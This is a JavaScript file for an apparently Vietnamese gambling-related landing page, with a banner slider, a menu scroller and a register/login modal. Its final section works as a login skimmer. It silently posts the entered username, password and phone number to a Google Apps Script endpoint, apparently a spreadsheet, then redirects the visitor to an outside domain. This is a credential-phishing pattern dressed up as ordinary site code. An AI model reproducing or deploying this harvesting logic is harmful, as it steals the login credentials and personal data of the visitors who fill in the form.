document.addEventListener('DOMContentLoaded', function() {
    
    // --- 1. XỬ LÝ BANNER TRƯỢT TỰ ĐỘNG ---
    const bannerSlider = document.getElementById('banner-slider');
    
    if (bannerSlider) {
        const bannerImages = bannerSlider.querySelectorAll('img');
        const totalBanners = bannerImages.length;
        let currentBannerIndex = 0;

        setInterval(() => {
            currentBannerIndex++;
            if (currentBannerIndex >= totalBanners) {
                currentBannerIndex = 0;
            }
            const moveDistance = -(currentBannerIndex * 100);
            bannerSlider.style.transform = `translateX(${moveDistance}%)`;
        }, 3000);
    }

    // --- 2. XỬ LÝ CUỘN MENU NGANG (TAB DANH MỤC) ---
    const catNav = document.getElementById('category-scroll');
    const btnLeft = document.getElementById('scroll-left');
    const btnRight = document.getElementById('scroll-right');

    if (catNav && btnLeft && btnRight) {
        btnLeft.addEventListener('click', () => {
            catNav.scrollBy({ left: -120, behavior: 'smooth' });
        });
        btnRight.addEventListener('click', () => {
            catNav.scrollBy({ left: 120, behavior: 'smooth' });
        });
    }

    // --- 3. XỬ LÝ HIỆU ỨNG CUỘN HIỆN PHẦN ĐẠI SỨ ---
    const ambassadorSection = document.querySelector('.ambassador-section');
    
    if (ambassadorSection) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('show-on-scroll');
                    observer.unobserve(entry.target); 
                }
            });
        }, {
            threshold: 0.15 
        });
        observer.observe(ambassadorSection);
    }

    // --- 4. XỬ LÝ MỞ / ĐÓNG MODAL ĐĂNG KÝ / ĐĂNG NHẬP ---
    const modal = document.getElementById('auth-modal');
    const closeBtn = document.getElementById('close-modal');
    const btnOpenReg = document.querySelector('.btn-register');
    const btnOpenLog = document.querySelector('.btn-login');

    const tabReg = document.getElementById('tab-register');
    const tabLog = document.getElementById('tab-login');
    const formReg = document.getElementById('form-register');
    const formLog = document.getElementById('form-login');

    function openModal(isLogin) {
        if(modal) modal.style.display = 'flex';
        
        if (isLogin) {
            tabLog.classList.add('active'); 
            tabReg.classList.remove('active');
            formLog.classList.add('active'); 
            formReg.classList.remove('active');
        } else {
            tabReg.classList.add('active'); 
            tabLog.classList.remove('active');
            formReg.classList.add('active'); 
            formLog.classList.remove('active');
        }
    }

    if(btnOpenReg) btnOpenReg.addEventListener('click', () => openModal(false));
    if(btnOpenLog) btnOpenLog.addEventListener('click', () => openModal(true));
    if(tabReg) tabReg.addEventListener('click', () => openModal(false));
    if(tabLog) tabLog.addEventListener('click', () => openModal(true));

    if(closeBtn) closeBtn.addEventListener('click', () => modal.style.display = 'none');
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.style.display = 'none';
    });

    // --- 5. RÀNG BUỘC, GỬI GGSHEET VÀ CHUYỂN HƯỚNG ---
    const targetUrl = 'https://shbetmm02.top/';
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwbnwHZBJtnDcL0Wmk_nxwmlwQ-cTb19yW8oMaPj-_tCEF1lFGAaIoGi8XcFRVnIAIH/exec';

    const formsToValidate = [
        { form: formReg, statusName: 'Đăng Ký' },
        { form: formLog, statusName: 'Đăng Nhập' }
    ];

    formsToValidate.forEach(item => {
        const form = item.form;
        if (!form) return;

        const submitBtn = form.querySelector('.submit-btn');
        const requiredInputs = form.querySelectorAll('input[required]');
        
        // Trạng thái nút ban đầu (mờ và khóa)
        submitBtn.disabled = true;

        // Lắng nghe sự kiện gõ phím để làm đậm/nhạt nút
        form.addEventListener('input', () => {
            let isFormValid = true;
            requiredInputs.forEach(input => {
                if (input.value.trim() === '') {
                    isFormValid = false;
                }
            });
            submitBtn.disabled = !isFormValid;
        });

        // Xử lý khi nhấn nút Xác nhận (Submit)
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            // Kiểm tra kỹ lại toàn bộ các trường không được để trống
            for (let input of requiredInputs) {
                if (input.value.trim() === '') {
                    alert('Vui lòng điền đầy đủ thông tin vào tất cả các trường!');
                    input.focus();
                    return;
                }
            }

            // Kiểm tra độ dài Tài khoản và Mật khẩu (Từ 6 đến 15 ký tự)
            const usernameInput = form.querySelector('input[name="username"]');
            const passwordInput = form.querySelector('input[name="password"]');

            if (usernameInput) {
                const uLen = usernameInput.value.trim().length;
                if (uLen < 6 || uLen > 15) {
                    alert('Tên đăng nhập phải từ 6 đến 15 ký tự!');
                    usernameInput.focus();
                    return;
                }
            }

            if (passwordInput) {
                const pLen = passwordInput.value.trim().length;
                if (pLen < 6 || pLen > 15) {
                    alert('Mật khẩu phải từ 6 đến 15 ký tự!');
                    passwordInput.focus();
                    return;
                }
            }

            // Kiểm tra Số điện thoại phải đúng 10 chữ số
            const phoneInput = form.querySelector('input[name="phone"]');
            if (phoneInput) {
                const phoneVal = phoneInput.value.trim();
                const phoneRegex = /^[0-9]{10}$/;
                if (!phoneRegex.test(phoneVal)) {
                    alert('Vui lòng nhập đúng số điện thoại gồm 10 chữ số!');
                    phoneInput.focus();
                    return;
                }
            }

            // Hiệu ứng đang kết nối
            const originalText = submitBtn.innerText;
            submitBtn.innerText = "Đang kết nối...";
            submitBtn.disabled = true;

            // Đóng gói dữ liệu gửi lên Google Sheets
            const formData = new FormData(form);
            formData.append('status', item.statusName);

            // Gửi dữ liệu ngầm bằng Fetch API (dùng no-cors để tránh lỗi trình duyệt)
            fetch(scriptURL, { method: 'POST', body: formData, mode: 'no-cors' })
                .then(() => {
                    // Chuyển hướng ngay lập tức sang trang đích sau khi gửi thành công
                    window.location.href = targetUrl;
                })
                .catch(error => {
                    alert('Lỗi đường truyền, vui lòng thử lại!');
                    submitBtn.innerText = originalText;
                    submitBtn.disabled = false;
                });
        });
    });
    
    
});
